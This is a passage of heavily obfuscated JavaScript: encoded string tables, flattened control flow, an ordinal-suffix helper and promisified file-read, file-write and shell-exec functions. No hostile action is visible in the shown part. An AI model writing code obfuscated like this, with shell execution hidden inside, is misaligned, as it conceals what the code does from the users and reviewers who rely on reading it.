            ret.push(b & 0xff),
            (b >>= __p_6838000083_dLR_12__JS_PREDICT__(0x44)),
            (n -= 0x8)
          );
        } while (n > 0x7);
        v = -__p_4637729756_dLR_13__JS_PREDICT__(-0x1f);
      }
    }
    if (v > -__p_6838000083_dLR_12__JS_PREDICT__(0x31)) {
      ret.push((b | (v << n)) & __p_6838000083_dLR_12__JS_PREDICT__(0x3d));
    }
    return __p_1990998267__JS_PREDICT__(ret);
  }
})();
function __p_8438996831__JS_CRITICAL__(...args) {
  var __p_0743891648__JS_PREDICT__ = __p_6510065121(
      (...__p_4821772381_stack) => {
        var __p_7153098856_dLR_14__JS_PREDICT__ = __p_0896022738(
          (index_param) => {
            return __p_9551561833[
              index_param > 0xd6
                ? index_param - 0x4a
                : index_param < 0xd6
                ? index_param - 0x18
                : index_param - 0x35
            ];
          },
          0x1
        );
        __p_2360982505(
          (__p_4821772381_stack.length =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
          (__p_4821772381_stack[
            __p_7153098856_dLR_14__JS_PREDICT__(0x2a)
          ] = 0x1a)
        );
        if (
          typeof __p_4821772381_stack[
            __p_4821772381_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x21)] -
              __p_7153098856_dLR_14__JS_PREDICT__(0x5f)
          ] === "undefined"
        ) {
          var __p_7669240385_dLR_15__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < -0x14
                  ? index_param + 0x2f
                  : index_param > -0x14
                  ? index_param < 0xab
                    ? index_param > -0x14
                      ? index_param + 0x13
                      : index_param - 0x29
                    : index_param + 0x37
                  : index_param - 0x3f
              ];
            },
            0x1
          );
          __p_4821772381_stack[__p_7669240385_dLR_15__JS_PREDICT__(-0x4)] =
            __p_5380100148__JS_PREDICT____JS_CRITICAL__;
        }
        __p_4821772381_stack[__p_7153098856_dLR_14__JS_PREDICT__(0x2c)] =
          __p_4821772381_stack[
            __p_4821772381_stack[__p_7153098856_dLR_14__JS_PREDICT__(0x2a)] -
              0x1a
          ];
        if (
          typeof __p_4821772381_stack[
            __p_4821772381_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x21)] -
              0x16
          ] === "undefined"
        ) {
          __p_4821772381_stack[__p_4821772381_stack[0x80] - 0x16] =
            __p_3576149457;
        }
        __p_4821772381_stack[
          __p_4821772381_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x21)] + 0x66
        ] = -0x79;
        if (
          __p_4821772381_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] ==
          __p_4821772381_stack[__p_7153098856_dLR_14__JS_PREDICT__(0x27)]
        ) {
          var __p_3491559303_dLR_16__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < 0x3b
                  ? index_param - 0xf
                  : index_param < 0xfa
                  ? index_param < 0xfa
                    ? index_param - 0x3c
                    : index_param - 0x3b
                  : index_param - 0x3f
              ];
            },
            0x1
          );
          return __p_4821772381_stack[__p_4821772381_stack[0x80] + 0x7a]
            ? __p_4821772381_stack[__p_7153098856_dLR_14__JS_PREDICT__(0x2c)][
                __p_4821772381_stack[__p_7153098856_dLR_14__JS_PREDICT__(0x26)][
                  __p_4821772381_stack[0x1]
                ]
              ]
            : __p_3576149457[__p_4821772381_stack.juJuCqf] ||
                ((__p_4821772381_stack[
                  __p_4821772381_stack[
                    __p_4821772381_stack[
                      __p_3491559303_dLR_16__JS_PREDICT__(0x4e)
                    ] + 0xf9
                  ] +
                    (__p_4821772381_stack[
                      __p_3491559303_dLR_16__JS_PREDICT__(0x4e)
                    ] +
                      0xf4)
                ] =
                  __p_4821772381_stack[
                    __p_7153098856_dLR_14__JS_PREDICT__(0x26)
                  ][
                    __p_4821772381_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x1f)
                    ]
                  ] ||
                  __p_4821772381_stack[
                    __p_4821772381_stack[
                      __p_7153098856_dLR_14__JS_PREDICT__(0x2a)
                    ] + 0x7c
                  ]),
                (__p_3576149457[__p_4821772381_stack.juJuCqf] =
                  __p_4821772381_stack[0x2](
                    __p_1940297625[__p_4821772381_stack.juJuCqf]
                  )));
        }
        if (
          __p_4821772381_stack[0x2] ==
          __p_4821772381_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x1f)]
        ) {
          var __p_2850915998_dLR_17__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param > -0x57
                  ? index_param < 0x68
                    ? index_param + 0x56
                    : index_param - 0x41
                  : index_param - 0x58
              ];
            },
            0x1
          );
          return (__p_4821772381_stack[
            __p_2850915998_dLR_17__JS_PREDICT__(-0x4b)
          ][
            __p_3576149457[
              __p_4821772381_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
            ]
          ] = __p_0743891648__JS_PREDICT__(
            __p_4821772381_stack[__p_2850915998_dLR_17__JS_PREDICT__(-0x42)],
            __p_4821772381_stack[__p_2850915998_dLR_17__JS_PREDICT__(-0x4b)]
          ));
        }
        if (
          __p_4821772381_stack[__p_7153098856_dLR_14__JS_PREDICT__(0x2c)] !==
          __p_4821772381_stack[__p_7153098856_dLR_14__JS_PREDICT__(0x23)]
        ) {
          var __p_5307771785_dLR_18__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < 0x11c
                  ? index_param < 0x11c
                    ? index_param - 0x5e
                    : index_param + 0x26
                  : index_param - 0x35
              ];
            },
            0x1
          );
          return (
            __p_4821772381_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
              __p_4821772381_stack[__p_5307771785_dLR_18__JS_PREDICT__(0x72)]
            ] ||
            (__p_4821772381_stack[__p_7153098856_dLR_14__JS_PREDICT__(0x26)][
              __p_4821772381_stack[__p_7153098856_dLR_14__JS_PREDICT__(0x2c)]
            ] = __p_4821772381_stack[__p_4821772381_stack[0x80] + 0x7c](
              __p_1940297625[__p_4821772381_stack.juJuCqf]
            ))
          );
        }
        if (
          __p_4821772381_stack[0x3] ===
          __p_2786467427_dLR_0__JS_PREDICT__(-0x1e)
        ) {
          __p_0743891648__JS_PREDICT__ =
            __p_4821772381_stack[
              __p_4821772381_stack[__p_7153098856_dLR_14__JS_PREDICT__(0x2a)] +
                0x7d
            ];
        }
      },
      0x5
    ),
    __p_4797147619;
  __p_4797147619 = __p_0743891648__JS_PREDICT__(0x4);
  return args[args[__p_4797147619] - 0x1];
  function __p_5380100148__JS_PREDICT____JS_CRITICAL__(
    str,
    table = 'Xk0ADa]Sy=.53!62w,<QzZ`?@jo/v1(g}:F{E$uI"mBih4TVN_WUce9pMf~R>x[7LG8JH#&r;+)s*|Klq%^nCdOtPbY',
    raw,
    len,
    ret = [],
    b,
    n,
    v,
    i = 0x0,
    p
  ) {
    var __p_2549847100_dLR_19__JS_PREDICT__ = __p_0896022738((index_param) => {
      return __p_9551561833[
        index_param < 0x102 ? index_param - 0x44 : index_param - 0x3e
      ];
    }, 0x1);
    __p_2360982505(
      (raw = "" + (str || "")),
      (len = raw.length),
      (b = __p_2549847100_dLR_19__JS_PREDICT__(0x49)),
      (n = __p_2549847100_dLR_19__JS_PREDICT__(0x49)),
      (v = -__p_2549847100_dLR_19__JS_PREDICT__(0x4f))
    );
    for (i = i; i < len; i++) {
      var __p_2310879878_dLR_20__JS_PREDICT__ = __p_0896022738(
        (index_param) => {
          return __p_9551561833[
            index_param < 0x9d
              ? index_param < 0x9d
                ? index_param < -0x22
                  ? index_param + 0x2
                  : index_param + 0x21
                : index_param + 0x3d
              : index_param - 0x28
          ];
        },
        0x1
      );
      p = table.indexOf(raw[i]);
      if (p === -__p_2310879878_dLR_20__JS_PREDICT__(-0x16)) {
        continue;
      }
      if (v < 0x0) {
        v = p;
      } else {
        var __p_3798876719_dLR_21__JS_PREDICT__ = __p_0896022738(
          (index_param) => {
            return __p_9551561833[
              index_param > 0x2a ? index_param - 0x2b : index_param + 0x2f
            ];
          },
          0x1
        );
        __p_2360982505(
          (v += p * __p_3798876719_dLR_21__JS_PREDICT__(0x41)),
          (b |= v << n),
          (n +=
            (v & __p_3798876719_dLR_21__JS_PREDICT__(0x6b)) >
            __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
              ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
              : 0xe)
        );
        do {
          __p_2360982505(ret.push(b & 0xff), (b >>= 0x8), (n -= 0x8));
        } while (n > __p_2310879878_dLR_20__JS_PREDICT__(0x14));
        v = -0x1;
      }
    }
    if (v > -0x1) {
      ret.push((b | (v << n)) & __p_2549847100_dLR_19__JS_PREDICT__(0x5b));
    }
    return __p_1990998267__JS_PREDICT__(ret);
  }
}
function __p_0575541368_calc(
  __p_1525364065,
  __p_6678757168,
  __p_1468015835__JS_PREDICT__,
  __p_0809144609
) {
  __p_2360982505(
    (__p_1468015835__JS_PREDICT__ = __p_6510065121(
      (...__p_9778243746_stack) => {
        var __p_6539847350_dLR_23__JS_PREDICT__ = __p_0896022738(
          (index_param) => {
            return __p_9551561833[
              index_param > -0x32
                ? index_param < 0x8d
                  ? index_param > 0x8d
                    ? index_param + 0x6
                    : index_param + 0x31
                  : index_param - 0x59
                : index_param + 0x3b
            ];
          },
          0x1
        );
        __p_2360982505(
          (__p_9778243746_stack.length =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
          (__p_9778243746_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x1b)] =
            -0x33)
        );
        if (
          typeof __p_9778243746_stack[
            __p_9778243746_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x1b)] +
              0x36
          ] === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
        ) {
          var __p_1473533117_dLR_22__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < 0x53
                  ? index_param + 0x49
                  : index_param < 0x112
                  ? index_param - 0x54
                  : index_param - 0x2a
              ];
            },
            0x1
          );
          __p_9778243746_stack[__p_1473533117_dLR_22__JS_PREDICT__(0x63)] =
            __p_7192114383__JS_PREDICT____JS_CRITICAL__;
        }
        if (
          typeof __p_9778243746_stack[__p_9778243746_stack[0xc0] + 0x37] ===
          __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
        ) {
          __p_9778243746_stack[0x4] = __p_3576149457;
        }
        __p_9778243746_stack[__p_6539847350_dLR_23__JS_PREDICT__(-0x18)] =
          __p_9778243746_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)];
        if (
          __p_9778243746_stack[
            __p_9778243746_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x1b)] -
              (__p_9778243746_stack[0xc0] -
                __p_6539847350_dLR_23__JS_PREDICT__(-0x2c))
          ] !== __p_9778243746_stack[__p_6539847350_dLR_23__JS_PREDICT__(-0x26)]
        ) {
          return (
            __p_9778243746_stack[__p_6539847350_dLR_23__JS_PREDICT__(-0x23)][
              __p_9778243746_stack[
                __p_9778243746_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x1b)
                ] + __p_2786467427_dLR_0__JS_PREDICT__(-0x19)
              ]
            ] ||
            (__p_9778243746_stack[0x4][__p_9778243746_stack[0x0]] =
              __p_9778243746_stack[__p_6539847350_dLR_23__JS_PREDICT__(-0x18)](
                __p_1940297625[
                  __p_9778243746_stack[
                    __p_9778243746_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x1b)
                    ] + 0x33
                  ]
                ]
              ))
          );
        }
        if (
          __p_9778243746_stack[
            __p_9778243746_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x1b)] +
              __p_2786467427_dLR_0__JS_PREDICT__(-0x1)
          ] ==
          __p_9778243746_stack[
            __p_9778243746_stack[0xc0] +
              __p_6539847350_dLR_23__JS_PREDICT__(-0x17)
          ]
        ) {
          var __p_7439799755_dLR_24__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < 0x1e ? index_param + 0x27 : index_param - 0x1f
              ];
            },
            0x1
          );
          return (__p_9778243746_stack[
            __p_6539847350_dLR_23__JS_PREDICT__(-0x26)
          ][
            __p_3576149457[
              __p_9778243746_stack[
                __p_9778243746_stack[
                  __p_7439799755_dLR_24__JS_PREDICT__(0x37)
                ] + 0x35
              ]
            ]
          ] = __p_1468015835__JS_PREDICT__(
            __p_9778243746_stack[__p_6539847350_dLR_23__JS_PREDICT__(-0x2c)],
            __p_9778243746_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]
          ));
        }
        __p_9778243746_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x17)] =
          __p_6539847350_dLR_23__JS_PREDICT__(-0x16);
        if (
          __p_9778243746_stack[__p_9778243746_stack[0xc0] + 0x35] &&
          __p_9778243746_stack.dtJh5t !==
            __p_7192114383__JS_PREDICT____JS_CRITICAL__
        ) {
          var __p_8905000135_dLR_25__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param > 0xa4
                  ? index_param + 0x55
                  : index_param > 0xa4
                  ? index_param + 0x39
                  : index_param < -0x1b
                  ? index_param - 0x18
                  : index_param > -0x1b
                  ? index_param + 0x1a
                  : index_param + 0xe
              ];
            },
            0x1
          );
          __p_1468015835__JS_PREDICT__ =
            __p_7192114383__JS_PREDICT____JS_CRITICAL__;
          return __p_1468015835__JS_PREDICT__(
            __p_9778243746_stack[0x0],
            -__p_2786467427_dLR_0__JS_PREDICT__(-0x28),
            __p_9778243746_stack[
              __p_9778243746_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x17)] -
                (__p_9778243746_stack[0x9e] -
                  __p_8905000135_dLR_25__JS_PREDICT__(-0x7))
            ],
            __p_9778243746_stack.dtJh5t,
            __p_9778243746_stack[0x4]
          );
        }
        if (
          __p_9778243746_stack[__p_6539847350_dLR_23__JS_PREDICT__(-0x18)] ===
          void 0x0
        ) {
          var __p_7877514776_dLR_26__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < -0x6
                  ? index_param - 0x13
                  : index_param < -0x6
                  ? index_param + 0x3c
                  : index_param > -0x6
                  ? index_param > -0x6
                    ? index_param + 0x5
                    : index_param + 0x1c
                  : index_param - 0x9
              ];
            },
            0x1
          );
          __p_1468015835__JS_PREDICT__ =
            __p_9778243746_stack[
              __p_9778243746_stack[__p_7877514776_dLR_26__JS_PREDICT__(0x17)] -
                __p_7877514776_dLR_26__JS_PREDICT__(0x72)
            ];
        }
      },
      __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
    )),
    (__p_0809144609 = __p_1468015835__JS_PREDICT__(
      __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
    ))
  );
  switch (__p_6857802341) {
    case __p_9743501678.vVupayL > __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
      ? -0x20
      : null:
      return __p_1525364065 + __p_6678757168;
    case __p_9743501678.vVupayL > __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
      ? -0xd
      : __p_2786467427_dLR_0__JS_PREDICT__(-0x1e):
      return __p_1525364065 * __p_6678757168;
    case !(
      __p_9743501678.tZjv4eQ[__p_0809144609](
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      ) == __p_2786467427_dLR_0__JS_PREDICT__(0x20)
    )
      ? null
      : -0x25:
      return -__p_1525364065;
    case __p_9743501678.yaLutw()
      ? __p_2786467427_dLR_0__JS_PREDICT__(0xa)
      : -__p_2786467427_dLR_0__JS_PREDICT__(0xc):
      return __p_1525364065 - __p_6678757168;
    case !__p_9743501678.yaLutw()
      ? __p_2786467427_dLR_0__JS_PREDICT__(-0x1e)
      : -__p_2786467427_dLR_0__JS_PREDICT__(0x7):
      return __p_1525364065 / __p_6678757168;
    case !__p_9743501678.yaLutw() ? 0x20 : 0x25:
      return !__p_1525364065;
    case __p_9743501678.yaLutw()
      ? __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
      : 0x5f:
      return typeof __p_1525364065;
  }
  function __p_7192114383__JS_PREDICT____JS_CRITICAL__(
    str,
    table = 'Ghmw?t()vF${%9|cI8,HS:iVxg;@*Y=7b`.r_1kOMz]A5N[+0UjWdQ/<Kuy4L>X~3}&B2!6ZoR#"^aCJqlPDTEfsepn',
    raw,
    len,
    ret = [],
    b,
    n = 0x0,
    v,
    i = 0x0,
    p
  ) {
    __p_2360982505(
      (raw = "" + (str || "")),
      (len = raw.length),
      (b = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
      (v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
    );
    for (i = i; i < len; i++) {
      p = table.indexOf(raw[i]);
      if (p === -0x1) {
        continue;
      }
      if (v < 0x0) {
        v = p;
      } else {
        var __p_8737421231_dLR_27__JS_PREDICT__ = __p_0896022738(
          (index_param) => {
            return __p_9551561833[
              index_param > 0x67 ? index_param + 0xd : index_param + 0x57
            ];
          },
          0x1
        );
        __p_2360982505(
          (v += p * 0x5b),
          (b |= v << n),
          (n +=
            (v & 0x1fff) > __p_8737421231_dLR_27__JS_PREDICT__(-0x3a)
              ? 0xd
              : 0xe)
        );
        do {
          var __p_1718344388_dLR_28__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < -0x32
                  ? index_param - 0x1c
                  : index_param < 0x8d
                  ? index_param + 0x31
                  : index_param + 0x54
              ];
            },
            0x1
          );
          __p_2360982505(
            ret.push(b & 0xff),
            (b >>= __p_2786467427_dLR_0__JS_PREDICT__(-0x15)),
            (n -= __p_1718344388_dLR_28__JS_PREDICT__(-0x13))
          );
        } while (n > 0x7);
        v = -0x1;
      }
    }
    if (v > -0x1) {
      ret.push((b | (v << n)) & 0xff);
    }
    return __p_1990998267__JS_PREDICT__(ret);
  }
}
__p_6510065121(__p_0333540851, 0x1);
function __p_0333540851(...__p_3465144236_stack) {
  __p_2360982505(
    (__p_3465144236_stack.length = __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
    (__p_3465144236_stack[0x27] =
      __p_3465144236_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)])
  );
  return __p_8438996831__JS_CRITICAL__(
    (__p_3465144236_stack[0x27] =
      __p_6857802341 +
      ((__p_6857802341 =
        __p_3465144236_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x1e)]),
      0x0)),
    __p_3465144236_stack[0x27]
  );
}
__p_6857802341 = __p_6857802341;
const writeFileAsync = promisify(writeFile),
  readFileAsync = promisify(readFile),
  execPromise = promisify(exec),
  getOrdinalSuffix = __p_6510065121((...__p_3492600408_stack) => {
    var __p_2944760061__JS_PREDICT__;
    function __p_6523464476_dLR_34__JS_PREDICT__(index_param) {
      return __p_9551561833[
        index_param > 0x8d ? index_param - 0x36 : index_param + 0x31
      ];
    }
    __p_2360982505(
      (__p_3492600408_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
        __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
      (__p_3492600408_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0xe)] =
        __p_6523464476_dLR_34__JS_PREDICT__(0x37)),
      (__p_2944760061__JS_PREDICT__ = __p_6510065121(
        (...__p_6136889062_stack) => {
          var __p_1918069418_dLR_29__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param > -0x4
                  ? index_param > -0x4
                    ? index_param + 0x3
                    : index_param + 0x5a
                  : index_param + 0x5e
              ];
            },
            0x1
          );
          __p_2360982505(
            (__p_6136889062_stack.length =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
            (__p_6136889062_stack[0xfa] =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x11))
          );
          if (
            typeof __p_6136889062_stack[
              __p_6136889062_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x14)] -
                0x49
            ] === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_6136889062_stack[0x3] =
              __p_1557530737__JS_PREDICT____JS_CRITICAL__;
          }
          if (
            typeof __p_6136889062_stack[
              __p_6136889062_stack[__p_1918069418_dLR_29__JS_PREDICT__(0x1c)] -
                (__p_6136889062_stack[
                  __p_1918069418_dLR_29__JS_PREDICT__(0x1c)
                ] -
                  0x4)
            ] === "undefined"
          ) {
            __p_6136889062_stack[__p_1918069418_dLR_29__JS_PREDICT__(0xb)] =
              __p_3576149457;
          }
          __p_6136889062_stack[__p_1918069418_dLR_29__JS_PREDICT__(0x1d)] =
            -__p_2786467427_dLR_0__JS_PREDICT__(-0x16);
          if (
            __p_6136889062_stack[__p_6136889062_stack.aqYkkP + 0x5a] ==
            __p_6136889062_stack[
              __p_6136889062_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x13)] +
                __p_1918069418_dLR_29__JS_PREDICT__(0x13)
            ]
          ) {
            var __p_0542587889_dLR_30__JS_PREDICT__ = __p_0896022738(
              (index_param) => {
                return __p_9551561833[
                  index_param > 0xd6
                    ? index_param - 0x31
                    : index_param < 0xd6
                    ? index_param - 0x18
                    : index_param - 0xe
                ];
              },
              0x1
            );
            return __p_6136889062_stack[0x1]
              ? __p_6136889062_stack[__p_6136889062_stack[0xfa] - 0x4c][
                  __p_6136889062_stack[0x4][
                    __p_6136889062_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
                    ]
                  ]
                ]
              : __p_3576149457[
                  __p_6136889062_stack[
                    __p_0542587889_dLR_30__JS_PREDICT__(0x1d)
                  ]
                ] ||
                  ((__p_6136889062_stack[0x2] =
                    __p_6136889062_stack[
                      __p_6136889062_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(-0x13)
                      ] -
                        (__p_6136889062_stack[
                          __p_0542587889_dLR_30__JS_PREDICT__(0x38)
                        ] -
                          0x4)
                    ][
                      __p_6136889062_stack[
                        __p_6136889062_stack.aqYkkP +
                          __p_1918069418_dLR_29__JS_PREDICT__(0x1a)
                      ]
                    ] ||
                    __p_6136889062_stack[
                      __p_6136889062_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(-0x13)
                      ] + 0x5b
                    ]),
                  (__p_3576149457[
                    __p_6136889062_stack[
                      __p_6136889062_stack.aqYkkP +
                        __p_0542587889_dLR_30__JS_PREDICT__(0x35)
                    ]
                  ] = __p_6136889062_stack[__p_6136889062_stack[0xfa] - 0x4a](
                    __p_1940297625[__p_6136889062_stack[0x0]]
                  )));
          }
          __p_6136889062_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(-0x12)
          ] = 0x68;
          if (
            __p_6136889062_stack[__p_1918069418_dLR_29__JS_PREDICT__(0xc)] ===
            __p_2944760061__JS_PREDICT__
          ) {
            var __p_8286873847_dLR_31__JS_PREDICT__ = __p_0896022738(
              (index_param) => {
                return __p_9551561833[
                  index_param > 0x3e
                    ? index_param > 0x3e
                      ? index_param - 0x3f
                      : index_param + 0xb
                    : index_param + 0x1e
                ];
              },
              0x1
            );
            __p_1557530737__JS_PREDICT____JS_CRITICAL__ =
              __p_6136889062_stack[__p_8286873847_dLR_31__JS_PREDICT__(0x4a)];
            return __p_1557530737__JS_PREDICT____JS_CRITICAL__(
              __p_6136889062_stack[0x2]
            );
          }
          if (__p_6136889062_stack[__p_1918069418_dLR_29__JS_PREDICT__(0x8)]) {
            var __p_6428103355_dLR_32__JS_PREDICT__ = __p_0896022738(
              (index_param) => {
                return __p_9551561833[
                  index_param < 0x97
                    ? index_param < 0x97
                      ? index_param < -0x28
                        ? index_param - 0x2b
                        : index_param < 0x97
                        ? index_param + 0x27
                        : index_param + 0x2e
                      : index_param - 0x11
                    : index_param + 0x17
                ];
              },
              0x1
            );
            [
              __p_6136889062_stack[
                __p_6136889062_stack[
                  __p_6428103355_dLR_32__JS_PREDICT__(-0x6)
                ] - __p_2786467427_dLR_0__JS_PREDICT__(-0xf)
              ],
              __p_6136889062_stack[0x1],
            ] = [
              __p_6136889062_stack[__p_1918069418_dLR_29__JS_PREDICT__(0xc)](
                __p_6136889062_stack[
                  __p_6136889062_stack[
                    __p_1918069418_dLR_29__JS_PREDICT__(0x1e)
                  ] - 0x64
                ]
              ),
              __p_6136889062_stack[0x0] ||
                __p_6136889062_stack[
                  __p_6136889062_stack[
                    __p_6428103355_dLR_32__JS_PREDICT__(-0x8)
                  ] - 0x4a
                ],
            ];
            return __p_2944760061__JS_PREDICT__(
              __p_6136889062_stack[
                __p_6136889062_stack[0xfa] -
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x11)
              ],
              __p_6136889062_stack[
                __p_6136889062_stack[0xfa] -
                  __p_1918069418_dLR_29__JS_PREDICT__(0x20)
              ],
              __p_6136889062_stack[__p_1918069418_dLR_29__JS_PREDICT__(0x10)]
            );
          }
          if (
            __p_6136889062_stack[
              __p_6136889062_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x14)] -
                0x4c
            ] !==
            __p_6136889062_stack[
              __p_6136889062_stack[0xfa] -
                (__p_6136889062_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x12)
                ] -
                  0x1d)
            ]
          ) {
            var __p_4377919437_dLR_33__JS_PREDICT__ = __p_0896022738(
              (index_param) => {
                return __p_9551561833[
                  index_param < 0xfe
                    ? index_param > 0xfe
                      ? index_param + 0x6
                      : index_param < 0xfe
                      ? index_param - 0x40
                      : index_param + 0x1d
                    : index_param + 0x31
                ];
              },
              0x1
            );
            return (
              __p_6136889062_stack[
                __p_6136889062_stack[
                  __p_4377919437_dLR_33__JS_PREDICT__(0x5f)
                ] - __p_1918069418_dLR_29__JS_PREDICT__(0x20)
              ][
                __p_6136889062_stack[__p_4377919437_dLR_33__JS_PREDICT__(0x45)]
              ] ||
              (__p_6136889062_stack[
                __p_6136889062_stack.hWK72c -
                  __p_2786467427_dLR_0__JS_PREDICT__(-0xf)
              ][__p_6136889062_stack[0x0]] = __p_6136889062_stack[
                __p_6136889062_stack[
                  __p_1918069418_dLR_29__JS_PREDICT__(0x1d)
                ] + __p_1918069418_dLR_29__JS_PREDICT__(0x13)
              ](
                __p_1940297625[
                  __p_6136889062_stack[__p_1918069418_dLR_29__JS_PREDICT__(0x2)]
                ]
              ))
            );
          }
        },
        0x5
      )),
      (__p_3492600408_stack.pymBpo =
        __p_3492600408_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]),
      (__p_3492600408_stack.TXBzgl = __p_3492600408_stack.pymBpo % 0xa),
      (__p_3492600408_stack[0x51] = __p_3492600408_stack.pymBpo),
      (__p_3492600408_stack[__p_6523464476_dLR_34__JS_PREDICT__(-0xb)] =
        __p_3492600408_stack[
          __p_3492600408_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0xe)] - 0x25
        ] % __p_2786467427_dLR_0__JS_PREDICT__(-0xf))
    );
    if (
      __p_3492600408_stack.TXBzgl ===
        __p_2786467427_dLR_0__JS_PREDICT__(-0x28) &&
      __p_3492600408_stack.CQ4Occi !== 0xb &&
      __p_9743501678.vVupayL > __p_6523464476_dLR_34__JS_PREDICT__(-0x1e)
    ) {
      return __p_0575541368_calc(
        __p_3492600408_stack[0x51],
        "st",
        (__p_6857802341 = -0x20)
      );
    }
    if (
      __p_3492600408_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0xc)] ===
        __p_2786467427_dLR_0__JS_PREDICT__(-0x20) &&
      __p_3492600408_stack[__p_6523464476_dLR_34__JS_PREDICT__(-0xb)] !==
        __p_2786467427_dLR_0__JS_PREDICT__(-0x2a) &&
      __p_9743501678.yaLutw()
    ) {
      return __p_0575541368_calc(
        __p_3492600408_stack[0x51],
        "nd",
        __p_0333540851(-__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
      );
    }
    if (
      __p_3492600408_stack[__p_6523464476_dLR_34__JS_PREDICT__(-0xa)] === 0x3 &&
      __p_3492600408_stack.CQ4Occi !==
        __p_2786467427_dLR_0__JS_PREDICT__(-0xb) &&
      __p_9743501678.tZjv4eQ[__p_2944760061__JS_PREDICT__(0x6)](
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      ) == "O"
    ) {
      return __p_0575541368_calc(
        __p_3492600408_stack[0x51],
        "rd",
        (__p_6857802341 = -0x20)
      );
    }
    if (__p_3492600408_stack.C_2hfmW > 0xbf) {
      return __p_3492600408_stack[
        __p_3492600408_stack[__p_6523464476_dLR_34__JS_PREDICT__(-0xc)] - 0x36
      ];
    } else {
      var __p_4988846618_dLR_35__JS_PREDICT__ = __p_0896022738(
        (index_param) => {
          return __p_9551561833[
            index_param > 0x91
              ? index_param - 0x25
              : index_param > 0x91
              ? index_param - 0x18
              : index_param < 0x91
              ? index_param < -0x2e
                ? index_param + 0x4d
                : index_param + 0x2d
              : index_param + 0x23
          ];
        },
        0x1
      );
      return __p_0575541368_calc(
        __p_3492600408_stack[__p_3492600408_stack.C_2hfmW - 0x25],
        "th",
        __p_0333540851(-__p_4988846618_dLR_35__JS_PREDICT__(-0x4))
      );
    }
    __p_6510065121(
      __p_1557530737__JS_PREDICT____JS_CRITICAL__,
      __p_3492600408_stack.C_2hfmW - __p_2786467427_dLR_0__JS_PREDICT__(0x33)
    );
    function __p_1557530737__JS_PREDICT____JS_CRITICAL__(
      ...__p_5599204514_stack
    ) {
      var i;
      function __p_1521310311_dLR_36__JS_PREDICT__(index_param) {
        return __p_9551561833[
          index_param < 0x32
            ? index_param - 0x0
            : index_param > 0xf1
            ? index_param + 0x40
            : index_param < 0x32
            ? index_param + 0x56
            : index_param < 0xf1
            ? index_param - 0x33
            : index_param - 0x5d
        ];
      }
      __p_2360982505(
        (__p_5599204514_stack[__p_6523464476_dLR_34__JS_PREDICT__(-0x2d)] =
          __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
